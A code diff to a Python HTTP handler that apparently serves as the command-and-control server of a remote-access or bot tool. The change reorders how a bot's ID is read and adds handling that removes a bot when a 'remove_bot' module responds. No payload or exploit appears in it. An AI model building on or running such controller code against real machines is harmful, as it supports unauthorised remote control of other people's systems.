@@ -364,6 +364,7 @@ class BotController(BaseHTTPRequestHandler):
         data = json.loads(b64decode(unquote_plus(data.replace("username=", "", 1)).encode()).decode())
 
         response = b64decode(data["response"])
+        bot_uid = data["bot_uid"]
         module_name = data["module_name"]
         response_options = dict(data["response_options"])
 
@@ -371,6 +372,13 @@ class BotController(BaseHTTPRequestHandler):
             try:
                 # Modules will already be loaded at this point.
                 modules.get_module(module_name).process_response(response, response_options)
+
+                # Note to self: if there's too many "special" modules here,
+                # pass the bot_uid to the process_response method instead.
+                if module_name == "remove_bot":
+                    self._model.remove_bot(bot_uid)
+                    self._update_bot_amount()
+
             except Exception as ex:
                 # Something went wrong in the process_response method.
                 self._view.output_separator()
@@ -383,7 +391,6 @@ class BotController(BaseHTTPRequestHandler):
             if response.decode().startswith("Directory changed to"):
                 # Update the view's footer to show the updated path.
                 new_path = response.decode().replace("Directory changed to: ", "", 1)
-                bot_uid = data["bot_uid"]
 
                 self._model.update_bot(bot_uid, time(), new_path)
                 self._update_bot_path(self._model.get_bot(bot_uid))
